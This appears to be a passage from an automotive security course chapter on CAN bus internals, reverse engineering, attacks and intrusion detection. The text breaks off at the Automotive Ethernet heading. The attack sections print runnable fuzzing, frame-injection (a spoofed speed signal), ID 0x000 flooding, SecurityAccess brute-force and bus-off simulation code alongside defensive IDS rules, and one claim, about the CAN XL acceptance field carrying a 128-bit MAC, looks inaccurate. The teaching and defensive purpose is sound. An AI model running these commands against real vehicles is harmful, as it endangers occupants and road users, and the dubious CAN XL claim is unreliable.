# Domain 21, Chapter 21A — In-Vehicle Networks and Protocols

> **Scope.** CAN bus in depth: physical layer (differential signaling, termination, bus topology), CAN 2.0B frame format, CSMA/CR arbitration, error handling and confinement, CAN message reverse engineering methodology (DBC files, signal extraction). CAN bus attacks: ID enumeration, fuzzing, injection, priority DoS, bus-off attacks, targeted error-frame injection. CAN FD: extended payload, dual bit-rate, BRS/ESI bits. CAN XL overview. Automotive Ethernet: 100BASE-T1/1000BASE-T1 physical layer, TSN (Time-Sensitive Networking), DoIP (ISO 13400), SOME/IP and SOME/IP-SD in depth, AUTOSAR Adaptive Platform. UDS (ISO 14229): all service IDs, ISO-TP (ISO 15765) transport, SecurityAccess algorithm reversing, NRC codes, exploitation workflows. SecOC: AUTOSAR COM stack integration, freshness management, MAC truncation, key distribution, bypass techniques. ISO/SAE 21434 TARA methodology, UN R155/R156 regulatory framework, compliance mapping.

---

## 1. CAN bus physical layer

### 1.1 Differential signaling — ISO 11898-2

CAN uses a two-wire differential bus: CAN-H (high) and CAN-L (low). In the recessive state (logical 1), both wires are at approximately 2.5 V (no differential). In the dominant state (logical 0), CAN-H rises to ~3.5 V and CAN-L drops to ~1.5 V, creating a ~2 V differential. The dominant state always wins over recessive — this is the physical basis for CSMA/CR arbitration.

The differential signaling provides common-mode noise rejection: electromagnetic interference affects both wires equally, and the receiver reads only the difference. This makes CAN robust in electrically noisy automotive environments.

ISO 11898-2 specifies the high-speed physical layer. The standard defines the voltage thresholds that receivers use to distinguish dominant from recessive: a receiver considers the bus dominant when `V_diff = V_CANH - V_CANL > 0.9 V`, and recessive when `V_diff < 0.5 V`. The range between 0.5 V and 0.9 V is undefined — this hysteresis band prevents oscillation at the transition boundary but also creates a window for voltage-glitching attacks where an attacker manipulates the differential voltage to fall within the undefined range, causing different receivers to interpret the same bit differently.

CAN transceivers (such as the NXP TJA1050/TJA1051 or Microchip MCP2551) translate between the MCU's single-ended logic levels and the differential bus. The transceiver handles bus fault protection (short to battery, short to ground) and includes thermal shutdown. From a security perspective, the transceiver is the component that an attacker must interface with — or bypass — when connecting to the bus. Hardware implants for CAN injection typically use a CAN transceiver IC connected to a microcontroller (Arduino, STM32, ESP32) running a SocketCAN stack or custom firmware.

### 1.2 Bus topology, termination, and stub constraints

CAN is a multi-drop bus: all nodes share two wires. The bus is terminated with 120 Ω resistors at each end (matching the characteristic impedance of the twisted pair). Missing or incorrect termination causes signal reflections that corrupt frames. An attacker connecting a device to the bus must account for the termination — adding a device in the middle of the bus does not require additional termination, but connecting at a stub requires keeping the stub short (< 30 cm at 500 kbps) to avoid reflections.

The stub length constraint is dictated by the propagation delay of the bus signal. At 500 kbps, one bit time is 2 μs. A signal reflection from a stub travels to the stub end and back; if this round-trip time exceeds a fraction of the bit time, the reflected signal interferes with the next bit. The rule of thumb: maximum stub length in meters ≈ (bit_time × propagation_speed) / (2 × safety_factor). At 500 kbps with a propagation speed of ~5 ns/m and a safety factor of 3, this yields approximately 0.3 m. At 125 kbps (body CAN), stubs up to 1 m are acceptable.

Automotive CAN buses use either a pure linear (bus) topology — a single trunk wire with short stubs to each ECU — or a star topology with a central hub. The linear topology is the reference design from ISO 11898-2, but many modern vehicles use a hybrid star topology because it simplifies wiring harness routing. Star topologies require careful impedance matching at the hub to avoid reflections. Some hub designs include active star couplers that regenerate signals, improving noise immunity at the cost of added complexity and potential single-point failure.

Typical automotive CAN runs at 500 kbps (high-speed CAN for powertrain/chassis) or 125 kbps (low-speed CAN for body electronics). Some vehicles use multiple CAN buses at different speeds, bridged by the gateway ECU.

### 1.3 CAN network architecture

A modern vehicle has 5–10 CAN buses segmented by domain:

The **powertrain CAN** (high-speed, 500 kbps) carries engine control, transmission, ABS, and ESC messages. The **chassis CAN** may be the same bus or a separate one carrying steering, suspension, and braking data. The **body CAN** (low-speed, 125 kbps) carries door locks, window controls, lighting, HVAC, and seat adjustment. The **infotainment CAN** connects the IVI (head unit), instrument cluster, and telematics. The **diagnostic CAN** connects to the OBD-II port and bridges to other buses via the gateway.

The **gateway ECU** sits at the intersection of all buses, selectively forwarding frames between domains based on a whitelist of arbitration IDs. The gateway is the vehicle's internal firewall — its filter rules determine the blast radius of an injection attack on any single bus.

### 1.4 Bit stuffing

CAN uses a bit-stuffing scheme to maintain synchronization between transmitter and receiver. After five consecutive bits of the same polarity, the transmitter inserts a stuff bit of the opposite polarity. The receiver detects and removes these stuff bits. Bit stuffing applies to the SOF through CRC fields; the CRC delimiter, ACK field, EOF, and IFS are fixed-form fields that are not stuffed.

Bit stuffing has a direct security consequence: a Stuff Error is flagged whenever more than five consecutive bits of the same polarity appear in the stuffed portion of a frame. An attacker who can inject a dominant bit during a sequence of recessive bits (or vice versa) at precisely the right time can avoid triggering a stuff error in other nodes while causing the target node to miscount the stuff bits, leading to a desynchronization between the target's bit position and the rest of the bus. This "bit-desync" technique is the foundation of advanced bus-off attacks that achieve single-ECU targeting.

The worst-case bit-stuffing overhead is 20%: one stuff bit per five data bits. For a standard CAN frame with 8 data bytes, the unstuffed bit count is 111 (SOF through EOF), and the maximum stuffed bit count is approximately 131. This overhead must be accounted for in bus-load calculations. A bus running at 85% utilization (measured in stuffed bits) leaves only 15% headroom — enough for an attacker to inject approximately 570 frames per second at maximum priority without immediately triggering overload conditions.

### 1.5 CSMA/CR arbitration — bit-level walkthrough

CAN's medium access control is Carrier-Sense Multiple Access with Collision Resolution (CSMA/CR). Unlike Ethernet's CSMA/CD (collision detection + backoff), CAN resolves collisions deterministically and non-destructively during the arbitration phase: the node with the lowest arbitration ID always wins.

The mechanism relies on the dominant/recessive property: when two nodes simultaneously transmit and one sends a dominant bit (0) while the other sends a recessive bit (1), the bus reflects the dominant state. Each transmitting node reads back the bus state bit-by-bit during the arbitration field. If a node sends a recessive bit but reads back dominant, it knows another node with a higher-priority (lower ID) message is transmitting, and it immediately stops transmitting and becomes a receiver.

Consider a concrete example. Three nodes begin transmitting simultaneously with IDs 0x3A0 (binary: 0111_1010_000), 0x1C5 (binary: 0011_1000_101), and 0x0F2 (binary: 0001_1110_010). After the SOF bit (all three send dominant), the arbitration proceeds through the 11-bit ID, most-significant bit first:

Bit 10: 0x3A0 sends 0, 0x1C5 sends 0, 0x0F2 sends 0. Bus is dominant. All three continue.
Bit 9: 0x3A0 sends 1, 0x1C5 sends 0, 0x0F2 sends 0. Bus is dominant (0). Node 0x3A0 sent recessive (1) but reads dominant (0) — it loses arbitration and stops. Nodes 0x1C5 and 0x0F2 continue.
Bit 8: 0x1C5 sends 1, 0x0F2 sends 0. Bus is dominant. Node 0x1C5 loses arbitration and stops.
Node 0x0F2 wins and transmits its data field uncontested.

This deterministic priority scheme means that safety-critical messages (ABS, airbag, ESC) are assigned low arbitration IDs to guarantee bus access under high load. An attacker exploiting this mechanism can transmit at ID 0x000 to win every arbitration and starve the entire bus — the priority DoS attack (§4.2).

### 1.6 Error handling and confinement — TEC/REC state machine

CAN defines a robust error-handling mechanism to prevent a faulty node from permanently disrupting the bus. Each CAN controller maintains two counters: the Transmit Error Counter (TEC) and the Receive Error Counter (REC). The counters increment on detected errors and decrement on successful transmissions/receptions.

**Error Active state** (TEC ≤ 127, REC ≤ 127): the node operates normally and can send Active Error Flags (6 dominant bits) when it detects an error. The Active Error Flag deliberately corrupts the current frame, alerting all nodes.

**Error Passive state** (TEC > 127 or REC > 127): the node can still transmit and receive, but it sends Passive Error Flags (6 recessive bits) when it detects an error. Passive Error Flags do not corrupt the bus for other nodes — the faulty node's influence is diminished. Additionally, an Error Passive transmitter must wait an additional 8-bit delay (Suspend Transmission) after the intermission field before transmitting again.

**Bus Off state** (TEC > 255): the node disconnects from the bus entirely. It cannot transmit or receive. Recovery from Bus Off requires either 128 occurrences of 11 consecutive recessive bits (a slow, automatic recovery) or a hardware reset.

The error frame format consists of: the Error Flag field (6 bits — Active Error Flag: 6 dominant bits; Passive Error Flag: 6 recessive bits), followed by the Error Delimiter (8 recessive bits). Any node detecting the error flag adds its own error flag, creating a superposition of error flags that can extend up to 12 bits.

Five error types are detected: **Bit Error** (transmitter reads a different bit than it sent, outside the arbitration field), **Stuff Error** (more than 5 consecutive bits of the same polarity — CAN uses bit-stuffing after 5 same-polarity bits), **CRC Error** (received CRC does not match computed CRC), **Form Error** (a fixed-form bit field contains an illegal value — e.g., recessive bits where CRC delimiter or ACK delimiter are expected), and **ACK Error** (transmitter does not see a dominant bit during the ACK slot, meaning no node acknowledged the frame).

From a security perspective, the TEC/REC mechanism is the target of the bus-off attack (§4.3): an attacker deliberately induces errors in a targeted ECU's transmissions to drive its TEC above 255, forcing it into Bus Off state.

---

## 2. CAN 2.0B frame format in detail

A standard CAN frame consists of:

**Start of Frame (SOF, 1 bit).** A single dominant bit that synchronizes all nodes.

**Arbitration field.** Standard frame: 11-bit arbitration ID + 1-bit RTR (Remote Transmission Request — dominant for data frame, recessive for remote frame). Extended frame: 11-bit base ID + 1-bit SRR (Substitute Remote Request, always recessive) + 1-bit IDE (Identifier Extension, recessive for extended) + 18-bit extended ID + 1-bit RTR.

The 29-bit extended ID in CAN 2.0B provides 2²⁹ ≈ 536 million unique identifiers, compared to 2¹¹ = 2048 for standard CAN. In practice, most automotive CAN networks use standard 11-bit IDs (the OEM controls the ID allocation and 2048 is sufficient per bus segment). Extended IDs appear more often in commercial vehicles (J1939, which uses 29-bit IDs with structured fields: Priority [3 bits], PGN [18 bits], Source Address [8 bits]) and in some diagnostic protocols.

**Control field (6 bits).** IDE (0 for standard, 1 for extended), r0 (reserved, dominant), DLC (Data Length Code, 4 bits — 0 to 8, specifying the number of data bytes).

**Data field (0–8 bytes).** The payload. The encoding of data within this field is manufacturer-specific and not defined by the CAN standard — this is where the reverse-engineering challenge lies (§3).

**CRC field (15 bits + delimiter).** A 15-bit CRC computed over the SOF through Data fields, followed by a recessive CRC delimiter bit. The CRC generator polynomial is `x¹⁵ + x¹⁴ + x¹⁰ + x⁸ + x⁷ + x⁴ + x³ + 1`. The CRC provides error detection (Hamming distance of 6 for frames up to 112 bits), but no authentication — a CRC is trivially computable by an attacker.

**ACK field (2 bits).** The transmitter sends a recessive bit; any receiver that successfully received the frame overwrites it with a dominant bit (acknowledgment). The second bit is a recessive delimiter. If no node acknowledges (the bus remains recessive), the transmitter detects no acknowledgment and retransmits.

**End of Frame (7 bits).** Seven recessive bits.

**Interframe Space (3 bits minimum).** Three recessive bits before the next frame.

A complete standard CAN frame with 8 data bytes occupies 111 bits without bit-stuffing, or up to 131 bits with worst-case bit-stuffing (one stuff bit per 5 bits). At 500 kbps, this takes 222–262 μs, yielding a maximum throughput of approximately 3800–4500 frames per second. This maximum bus utilization is relevant for DoS calculations: an attacker flooding the bus with 0x000 frames consumes all available bandwidth.

---

## 3. CAN message reverse engineering

### 3.1 The challenge

CAN arbitration IDs identify message types, not senders or functions. The mapping from arbitration ID to vehicle function (e.g., "ID 0x188 = engine RPM, bytes 2–3, big-endian, scale 0.25, offset 0") is proprietary and undocumented (stored in the OEM's DBC database files). Reverse engineering this mapping is a prerequisite for any targeted CAN attack.

### 3.2 Methodology

**Passive enumeration.** Connect a CAN interface (PCAN-USB, CANtact, SocketCAN-compatible adapter) to the OBD-II port. Log all traffic with `candump -l can0`. Analyze: which IDs appear, their frequency (periodic messages have consistent intervals — engine RPM at 10 ms, wheel speed at 20 ms), and the range of data values.

**Correlation.** Perform a physical action (press the brake, turn the steering wheel, accelerate, open a door) and correlate the change with changes in CAN messages. `cansniffer` (from can-utils) shows only changing bytes, making correlation easier. The analyst identifies which bytes in which ID change in response to the physical stimulus.

**Signal extraction.** Once the relevant ID and byte positions are identified, determine the encoding: byte order (big-endian vs little-endian), scale and offset (raw_value × scale + offset = physical_value), data type (unsigned integer, signed integer, boolean flag), and bit-level packing (multiple signals packed into a single 8-byte frame using specific bit positions).

**DBC files.** The standard format for CAN signal databases. A DBC file maps: message ID → message name, each signal within the message (name, start bit, length in bits, byte order, scale, offset, min/max, unit, receiving node). Publicly-available DBC files exist for some vehicles (from open-source projects like OpenDBC/commaai); most are proprietary.

A DBC file entry looks like:

```
BO_ 392 EngineData: 8 ECM
 SG_ EngineRPM : 0|16@1+ (0.25,0) [0|16383.75] "rpm" BCM,IC
 SG_ EngineTemp : 16|8@1+ (1,-40) [-40|215] "degC" BCM,IC
 SG_ ThrottlePos : 24|8@1+ (0.392157,0) [0|100] "%" BCM
```

This defines message ID 0x188 (decimal 392) named `EngineData`, 8 bytes, sent by node `ECM`. Signal `EngineRPM` starts at bit 0, 16 bits long, little-endian (`@1`), unsigned (`+`), scale 0.25, offset 0. The `cantools` Python library parses DBC files and decodes raw CAN data into physical values:

```python
import cantools
import can

db = cantools.database.load_file('vehicle.dbc')
bus = can.interface.Bus(channel='can0', bustype='socketcan')

for msg in bus:
    try:
        decoded = db.decode_message(msg.arbitration_id, msg.data)
        print(f"ID 0x{msg.arbitration_id:03X}: {decoded}")
    except KeyError:
        pass  # Unknown ID, not in DBC
```

### 3.3 Tools

**SavvyCAN**: GUI-based CAN analysis tool. Captures, replays, filters, and graphically visualizes CAN data. Supports DBC loading. Its graphing capability plots signal values over time — the primary visual tool for correlation during RE. The scripting engine allows automated RE workflows: capture traffic, apply a DBC, graph the decoded signals, and export to CSV for further analysis.

**CANalyzer/CANoe** (Vector): the industry-standard professional CAN analysis tools used by OEMs and Tier-1 suppliers. Licensed, expensive (~$5000+), but support all automotive protocols (CAN, CAN FD, LIN, FlexRay, Ethernet, SOME/IP). The CAPL (CAN Access Programming Language) scripting engine allows complex simulations and test automation.

**Kayak**: open-source Java-based CAN analysis tool. Lightweight alternative to SavvyCAN for basic capture and analysis.

**python-can**: Python library for CAN bus interaction (sending, receiving, filtering). Supports SocketCAN (Linux), PCAN (Windows/Linux), Vector hardware, and virtual CAN interfaces. The `python-can` + `cantools` combination is the standard open-source RE toolkit.

**caringcaribou**: an automotive security tool purpose-built for CAN bus security testing. It automates common diagnostic attack workflows:

```bash
# Discover ECUs that respond to UDS (scan all IDs from 0x600-0x7FF)
python -m caringcaribou uds discovery

# Enumerate supported UDS services on a specific ECU (arbitration ID 0x7E0)
python -m caringcaribou uds services 0x7E0 0x7E8

# Brute-force SecurityAccess on a specific ECU
python -m caringcaribou uds security_access 0x7E0 0x7E8

# Scan for XCP (Universal Measurement and Calibration Protocol) endpoints
python -m caringcaribou xcp discovery

# Fuzz a specific UDS service
python -m caringcaribou uds fuzz 0x7E0 0x7E8 0x27  # Fuzz SecurityAccess
```

caringcaribou's modular architecture allows adding custom modules for OEM-specific protocols and attack sequences.

**Scapy with CAN layer**: Scapy supports CAN via the `CAN` layer on SocketCAN interfaces. This enables scriptable CAN frame construction with full protocol-layer awareness:

```python
from scapy.layers.can import CAN
from scapy.all import conf

conf.contribs['CANSocket'] = {'iface': 'can0'}
from scapy.contrib.cansocket import CANSocket

sock = CANSocket(iface='can0')
pkt = CAN(identifier=0x188, length=8, data=b'\x00\x00\xFF\xFF\x00\x00\x00\x00')
sock.send(pkt)

# Sniffing with filter
packets = sock.sniff(count=100, timeout=5)
for p in packets:
    print(f"ID: 0x{p.identifier:03X} Data: {p.data.hex()}")
```

### 3.4 Automated RE approaches

Manual correlation does not scale to the hundreds of CAN IDs on a modern vehicle. Automated approaches include:

**Statistical clustering.** Group CAN messages by temporal behavior (period, jitter) and data distribution (entropy per byte, range). Messages with similar temporal patterns often belong to the same ECU or functional domain.

**Information-theoretic signal boundary detection.** Compute the entropy of individual bits across a large capture. Bit positions that are constant (entropy = 0) are likely unused or are flag bits. Bit positions with maximum entropy carry data. Boundaries between signals often correspond to entropy transitions. The `CAN-D` (CAN Decoder) algorithm from the USENIX Security 2020 paper automates this: it identifies signal boundaries, byte order, and likely data types purely from CAN traces without physical stimulus correlation.

**Machine-learning-based decoder.** Train a model on known DBC-annotated CAN traces from similar vehicles (same platform or OEM), then transfer the signal mappings to the target vehicle. This works because OEMs reuse signal layouts across vehicle generations within the same platform.

---

## 4. CAN bus attacks in depth

### 4.1 ID enumeration

Before launching any targeted attack, the adversary must enumerate the active CAN IDs, their periodicity, and their data ranges. The primary tool is `cansniffer`, which displays only frames whose data bytes have changed since the last update:

```bash
# Show only changing bytes, color-coded, on vcan0
cansniffer -c vcan0

# Log all traffic with timestamps (for later offline analysis)
candump -l -t A can0

# Filter to a specific ID range (e.g., only powertrain IDs 0x100-0x1FF)
candump can0,100:7FF

# Count unique IDs observed in a 60-second capture
candump -T 60000 -l can0 && grep -oP 'can0\s+\K[0-9A-F]+' candump-*.log | sort -u | wc -l
```

The attacker correlates the enumerated IDs with physical actions to map IDs to functions, as described in the RE methodology (§3.2).

### 4.2 Fuzzing

Fuzzing aims to discover unexpected ECU behavior by sending random or semi-random CAN frames. The simplest approach uses `cangen`:

```bash
# Random ID, random data, random DLC, 10 ms interval
cangen vcan0 -g 10 -I r -D r -L r

# Fixed ID, random data (target-specific fuzzing of a single ECU)
cangen vcan0 -g 5 -I 0x7DF -D r -L 8

# Incrementing data bytes (walking-bit pattern)
cangen vcan0 -g 10 -I 0x188 -D i -L 8
```

Targeted fuzzing with Python provides more control:

```python
import can
import random
import time

bus = can.interface.Bus(channel='can0', bustype='socketcan')
target_id = 0x188  # Suspected engine-control message

for i in range(10000):
    data = [random.randint(0, 255) for _ in range(8)]
    msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
    bus.send(msg)
    time.sleep(0.005)  # 5 ms interval
```

Fuzzing on a live vehicle poses physical safety risks: sending random data to powertrain or chassis ECUs can trigger unexpected actuator behavior (sudden braking, steering intervention, engine cutoff). Researchers typically fuzz on bench setups with isolated ECUs or use virtual CAN (`vcan0`) for initial testing.

The 2015 research by Charlie Miller and Chris Valasek demonstrated that CAN fuzzing on a Jeep Cherokee revealed undocumented diagnostic commands that could control steering and braking — the CAN-level payload of their remote exploit chain (CVE-2015-5611, though the remote entry was via the cellular interface).

### 4.3 Injection

The attacker sends crafted frames on the CAN bus. Because CAN has no source authentication, the receiving ECU processes the injected frame identically to a legitimate one. The attacker must know (or reverse-engineer) the target ID and data encoding.

```bash
# Inject a single frame: ID 0x188, data DEADBEEF00000000
cansend vcan0 188#DEADBEEF00000000

# Inject at high rate (overpower the real ECU's periodic message)
while true; do cansend can0 188#0000000000000000; done

# Replay a captured frame sequence
canplayer -I candump-2024-01-15_143022.log can0=vcan0
```

A more sophisticated injection using `python-can` that overwrites the speedometer reading:

```python
import can
import struct
import time

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Inject fake vehicle speed (ID 0x0B4 on many Toyota platforms)
# Speed signal: bytes 5-6, big-endian, scale 0.01 km/h
target_speed_kmh = 200.0
raw_speed = int(target_speed_kmh / 0.01)
data = bytearray(8)
struct.pack_into('>H', data, 5, raw_speed)

while True:
    msg = can.Message(arbitration_id=0x0B4, data=data, is_extended_id=False)
    bus.send(msg)
    time.sleep(0.01)  # Match the real ECU's 10 ms period
```

Examples: injecting a door-unlock command (body CAN), manipulating the speedometer reading (instrument cluster), sending a false ABS-activation signal (chassis CAN — potentially dangerous), or injecting a false engine-torque request (powertrain CAN — potentially dangerous).

Detection is challenging: the injected frames are indistinguishable from legitimate ones at the protocol level. Statistical anomaly detection (unexpected frame frequency, out-of-range data values, messages from IDs that should only be sent by a specific ECU) is the primary IDS approach.

### 4.4 Priority DoS

The attacker transmits a continuous stream of frames with arbitration ID 0x000 (the highest priority — wins every arbitration). All legitimate frames with higher IDs are starved. This is a bus-level denial of service that affects all communication on the bus.

```bash
# Priority DoS: flood ID 0x000 at maximum rate
cangen can0 -g 0 -I 0x000 -D 0000000000000000 -L 8

# Monitor bus load to confirm saturation
canbusload can0@500000
```

At 500 kbps with 8-byte payloads, the bus can carry approximately 4000 frames per second. A single attacker node can saturate the bus, preventing all safety-critical messages (ABS, ESC, airbag) from being transmitted. The attack requires only physical CAN bus access and a low-cost microcontroller.

Variant: targeted DoS by injecting frames with the same ID as a specific victim ECU's output. The real ECU's frames lose arbitration against the attacker's frames (if timed correctly), replacing the real data with the attacker's values.

### 4.5 Bus-off attack

The attacker deliberately transmits error frames (dominant bits during another node's frame) to trigger error increments in a targeted ECU's error counters. When the target ECU's Transmit Error Counter exceeds 255, it enters the Bus Off state and disconnects from the bus — a targeted DoS against a specific ECU without flooding the entire bus.

This requires precise timing (the attacker must inject dominant bits during the target ECU's frame, not during other ECUs' frames) and is more sophisticated than a simple flood.

The bus-off attack was formalized by Cho and Shin at USENIX Security 2016 ("Error Handling of In-Vehicle Networks Makes Them Vulnerable"). Their attack uses a two-phase approach: first, the attacker synchronizes to the target ECU's transmission schedule by monitoring the bus for the target's arbitration ID. Second, when the target ECU begins transmitting, the attacker injects a dominant bit during a bit position where the target ECU expects its transmitted recessive bit to be read back correctly. This triggers a Bit Error in the target ECU, incrementing its TEC by 8. The attacker repeats this at each transmission opportunity. After 32 successful error injections (32 × 8 = 256 > 255), the target enters Bus Off.

The timing precision required is at the bit level: at 500 kbps, one bit time is 2 μs. The attacker must inject the dominant bit within a 2 μs window during the target ECU's recessive bit. This is achievable with a microcontroller that has direct access to the CAN transceiver's TX pin — bypassing the CAN controller's normal frame-transmission logic — and a timer interrupt synchronized to the target ECU's transmission period.

A simplified Python simulation demonstrating the bus-off attack concept (on a virtual CAN interface, where actual bit-level manipulation is not possible, but the frame-level logic can be demonstrated):

```python
import can
import time
import threading

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
target_id = 0x188
victim_tec_simulated = 0

def monitor_target():
    """Monitor for target ECU frames and inject error-inducing frames."""
    global victim_tec_simulated
    for msg in bus:
        if msg.arbitration_id == target_id:
            # In real attack: inject dominant bit during target's
            # recessive bit via hardware CAN transceiver manipulation.
            # On vcan: simulate by injecting a conflicting frame
            # immediately (real attack is bit-level, not frame-level)
            error_msg = can.Message(
                arbitration_id=target_id,
                data=b'\xFF' * 8,
                is_error_frame=True
            )
            bus.send(error_msg)
            victim_tec_simulated += 8
            print(f"[*] Error injected. Simulated victim TEC: {victim_tec_simulated}")
            if victim_tec_simulated > 255:
                print("[+] Target would enter Bus Off state")
                break

monitor_thread = threading.Thread(target=monitor_target, daemon=True)
monitor_thread.start()
time.sleep(5)  # Allow monitoring for 5 seconds
```

The attack is stealthy: the attacker's error injections are timed to affect only the target ECU's frames, and other ECUs may not notice the disruption until the target goes silent. Counter: some modern CAN controllers implement "fast recovery from Bus Off" modes that reset the TEC after a configurable delay, but these do not prevent the attack — they only reduce the duration of the Bus Off state.

A more robust defense is the CAN bus guardian — a secondary hardware monitor (implemented in a separate IC or in the CAN transceiver itself) that observes each node's transmission behavior and can electrically disconnect the node from the bus if anomalous error patterns are detected. The NXP TJA1462 CAN transceiver includes an integrated bus guardian that monitors the dominant-bit duty cycle and disconnects the node if it exceeds a configurable threshold, preventing both bus-off attacks and stuck-dominant failures.

### 4.6 CAN intrusion detection

Because CAN has no built-in authentication, detection relies on behavioral analysis. Three main approaches:

**Specification-based IDS.** Encodes known-good CAN behavior as rules: allowed arbitration IDs per bus segment, expected DLC for each ID, valid data ranges per signal, and expected transmission period per ID. Any deviation triggers an alert. This approach has low false-positive rates for well-characterized buses but cannot detect attacks that stay within the specification (e.g., injecting a valid-range speedometer value at the correct period).

**Statistical anomaly detection.** Models the statistical properties of CAN traffic: message frequency distributions (a legitimate ECU transmits at a fixed period; injection increases the observed frequency), inter-arrival time distributions (an injected frame appears between two legitimate frames, halving the normal inter-arrival time), and data entropy per ID (random fuzzing data has higher entropy than legitimate sensor data). The seminal approach is clock-based IDS (Cho and Shin, CCS 2016): each ECU has a slightly different clock frequency, producing a characteristic jitter fingerprint in its transmission timestamps. An injected frame from a different node has a different clock fingerprint, enabling sender identification without cryptographic authentication.

**Machine-learning-based IDS.** Trains LSTM networks, autoencoders, or other sequence models on normal CAN traffic to learn temporal and data patterns. Anomalous sequences (injection, fuzzing, missing frames from bus-off attacks) are flagged. The challenge is training data: the model must be trained on clean traffic, and adversarial evasion (an attacker who knows the IDS model can craft inputs that evade detection) is an open research problem. Published results (e.g., the CANet autoencoder from Hanselmann et al., 2020) achieve >99% detection rates on standard attack datasets, but real-world deployment faces challenges with concept drift (legitimate CAN traffic changes over the vehicle's lifecycle due to firmware updates and environmental variation).

Deployment: CAN IDS is typically implemented in the gateway ECU or in a dedicated security ECU, monitoring traffic on all bus segments. AUTOSAR specifies the Intrusion Detection System Manager (IdsM) module for centralized IDS event collection and reporting.

**Specification-based IDS rule examples.** A concrete rule set for a powertrain CAN bus might include:

```
RULE 1: ID 0x0B4 (VehicleSpeed) — period 20 ms ± 2 ms, DLC = 8,
        bytes 5-6 range [0x0000, 0x7530] (0-300 km/h scaled)
        ALERT if: period < 15 ms (injection doubles frequency)
                  period > 30 ms (source ECU offline or bus-off)
                  DLC != 8 (malformed frame)
                  bytes 5-6 > 0x7530 (out-of-range speed value)

RULE 2: ID 0x000-0x00F — these IDs should NEVER appear on this bus
        ALERT if: any frame with ID in this range (priority DoS attempt)

RULE 3: ID 0x7DF (OBD functional broadcast) — should only appear
        when diagnostic session is active (gateway signals this state)
        ALERT if: 0x7DF appears without active diagnostic session flag

RULE 4: Bus load — normal range 30-60% on powertrain CAN
        ALERT if: bus load > 85% sustained for > 100 ms (DoS in progress)
```

The AUTOSAR IdsM collects alerts from individual IDS sensors (one per bus segment), correlates them (e.g., a bus-load alert simultaneous with high-frequency injection alerts confirms a DoS attack), and reports security events to the vehicle's Security Event Memory (SecM) and — if configured — to the OEM's backend Security Operations Center (SOC) via the telematics unit. This backend reporting capability is a UN R155 requirement: the OEM must demonstrate "ongoing monitoring for new threats" as part of the CSMS.

---

## 5. CAN FD

### 5.1 Frame format extensions

CAN FD (ISO 11898-1:2015) extends the CAN frame:

**Increased payload.** DLC values 9–15 map to data lengths of 12, 16, 20, 24, 32, 48, and 64 bytes (the DLC field is still 4 bits, but values above 8 are reinterpreted). This allows a single CAN FD frame to carry significantly more data.

**FDF (FD Format) bit.** Replaces the reserved bit `r0` in the control field. The FDF bit is recessive in CAN FD frames and dominant in classic CAN frames — this is how a receiver distinguishes the two formats.

**Bit Rate Switch (BRS).** The BRS bit signals the transition from the arbitration-phase bit rate (standard speed, for arbitration compatibility with CAN 2.0 nodes) to the data-phase bit rate (up to 8 Mbps for the data field). This provides higher throughput while maintaining arbitration compatibility. The arbitration phase remains at the nominal bit rate (typically 500 kbps) because all nodes — including classic CAN nodes that cannot decode CAN FD — must be able to participate in arbitration without corrupting the bus.

**Error State Indicator (ESI).** The ESI bit indicates whether the transmitter is Error Active (dominant) or Error Passive (recessive), providing additional diagnostic information.

**CRC.** CAN FD uses a 17-bit CRC (for payloads ≤ 16 bytes) or 21-bit CRC (for payloads > 16 bytes), replacing the 15-bit CRC of CAN 2.0. The longer CRC accommodates the larger payload and maintains the same error-detection probability.

CAN FD retains CAN's lack of authentication. SecOC (§8) is the mechanism for adding authentication to CAN FD frames.

### 5.2 Dual bit-rate operation

In the arbitration phase, the bus operates at the nominal bit rate (e.g., 500 kbps) — this ensures backward compatibility with classic CAN nodes that share the bus. After the BRS bit, the bit rate switches to the data-phase rate (typically 2 Mbps, with some implementations reaching 5 or 8 Mbps). The switch back occurs at the CRC delimiter. This dual-rate scheme increases effective throughput by 4–16× for data transfer while preserving the deterministic arbitration behavior of classic CAN.

The higher data-phase bit rate imposes tighter constraints on bus topology: signal propagation delays that are acceptable at 500 kbps cause bit-timing errors at 5 Mbps. CAN FD buses must be shorter (typically < 10 m at 5 Mbps) with minimal stub lengths. This effectively limits CAN FD to domain-internal communication (within a single vehicle subsystem) rather than vehicle-wide buses.

### 5.3 Security implications

The 64-byte payload of CAN FD has direct security implications. The larger payload makes SecOC more practical: with only 8 bytes in classic CAN, fitting both the signal data and a truncated MAC plus freshness value was severely constrained. With 64 bytes, a CAN FD frame can carry 8 bytes of signal data, a 4-byte truncated freshness value, and a 4-byte truncated MAC, with 48 bytes remaining for additional signals. This shifts the security-bandwidth tradeoff significantly in favor of authentication.

Conversely, the larger payload also enables more complex injection attacks: an attacker can inject multi-signal frames with 64 bytes of crafted data, potentially affecting multiple vehicle functions in a single frame. Fuzzing with 64-byte random payloads exercises a much larger input space per ECU.

### 5.4 CAN XL

CAN XL (CiA 610) is the next-generation CAN protocol, designed to bridge the gap between CAN FD and Automotive Ethernet. Key features: payload up to 2048 bytes, data-phase bit rate of 10 Mbps, native support for encapsulating Ethernet frames within CAN XL frames (enabling CAN-to-Ethernet bridging without application-layer gateways), and a priority-based acceptance field that replaces the classic arbitration ID with a more flexible addressing scheme.

CAN XL is explicitly designed with security in mind: the 2048-byte payload eliminates the MAC truncation problem that plagues SecOC on classic CAN, and the protocol includes provisions for authentication headers within the frame format. The acceptance field can carry a full 128-bit MAC alongside the data payload without any truncation, making brute-force MAC forgery computationally infeasible (2¹²⁸ attempts). Additionally, CAN XL's Ethernet-frame encapsulation capability means that MACsec or IPsec-protected Ethernet frames can be tunneled transparently over CAN XL segments — unifying the security model across CAN and Ethernet domains.

CAN XL also introduces a content-based addressing mode alongside the traditional ID-based addressing: frames can be routed based on payload content, enabling service-oriented communication patterns similar to SOME/IP but at the CAN layer. This has security implications: content-based routing rules must be hardened against manipulation, and the larger address space (compared to CAN's 11/29-bit IDs) requires more complex IDS rule sets. As of 2025, CAN XL silicon from Bosch and NXP is available for evaluation, with production deployment expected in 2027-2028 vehicle platforms.

---

## 6. Automotive Ethernet

### 6.1 Physical layer — 100BASE-T1 and 1000BASE-T1

